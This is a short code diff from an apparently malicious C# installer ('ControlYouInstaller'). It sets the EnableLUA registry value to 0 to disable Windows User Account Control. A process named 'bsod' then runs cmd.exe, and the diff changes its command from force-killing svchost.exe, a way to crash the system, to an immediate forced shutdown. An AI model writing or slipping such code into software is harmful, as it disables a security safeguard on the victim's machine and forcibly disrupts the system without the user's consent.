@@ -40,9 +40,12 @@ namespace ControlYouInstaller
                     RegistryKey rk2 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
                     rk2.SetValue("EnableLUA", 0);
 
+                    rk2.Close();
+                    rk.Close();
+
                     Process bsod = new Process();
                     bsod.StartInfo.FileName = "C:\\Windows\\System32\\cmd.exe";
-                    bsod.StartInfo.Arguments = "/C taskkill /f /im svchost.exe";
+                    bsod.StartInfo.Arguments = "/C shutdown /s /t 00";
                     bsod.Start();
 
                 }
